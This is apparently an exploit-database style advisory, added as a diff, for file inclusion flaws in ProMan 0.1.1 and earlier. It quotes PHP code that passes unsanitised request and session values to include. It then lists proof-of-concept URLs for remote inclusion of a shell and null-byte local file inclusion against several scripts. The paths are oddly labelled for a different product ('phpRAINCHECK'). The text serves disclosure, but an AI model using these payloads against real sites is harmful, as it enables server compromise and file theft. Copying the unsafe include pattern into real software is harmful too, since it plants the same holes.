@@ -1,0 +1,35 @@
+##############################################################
+##ProMan  <= 0.1.1 Multiple File Include Vulnerability
+##############################################################
+Author: cr4wl3r <cr4wl3r\x40linuxmail\x2Eorg>
+Download: http://sourceforge.net/projects/pman/files/
+##############################################################
+[RFI Code]
+
+<?php
+                    if (!($_GET['page']))
+                    	include('info.php');
+                    else    
+                        include $_GET['page'].'.php'; 
+                ?>
+
+[LFI Code]
+
+include_once('lang/'.$_SESSION['userLang'].'/elisttasks.php');
+if (!defined('PROMAN'))
+ 	pexit ($l['no hack']); 
+##############################################################
+PoC RFI:
+ [phpRAINCHECK_path]/_center.php?page=[Shell]
+##############################################################
+PoC LFI:
+ [phpRAINCHECK_path]/elisttasks.php?_SESSION[userLang]=[LFI%00]
+ [phpRAINCHECK_path]/managepmanagers.php?_SESSION[userLang]=[LFI%00]
+ [phpRAINCHECK_path]/manageusers.php?_SESSION[userLang]=[LFI%00]
+ [phpRAINCHECK_path]/helpfunc.php?_SESSION[userLang]=[LFI%00]
+ [phpRAINCHECK_path]/managegroups.php?_SESSION[userLang]=[LFI%00]
+ [phpRAINCHECK_path]/manageprocess.php?_SESSION[userLang]=[LFI%00]
+ [phpRAINCHECK_path]/manageusersgroups.php?_SESSION[userLang]=[LFI%00]
+
+others...
+##############################################################
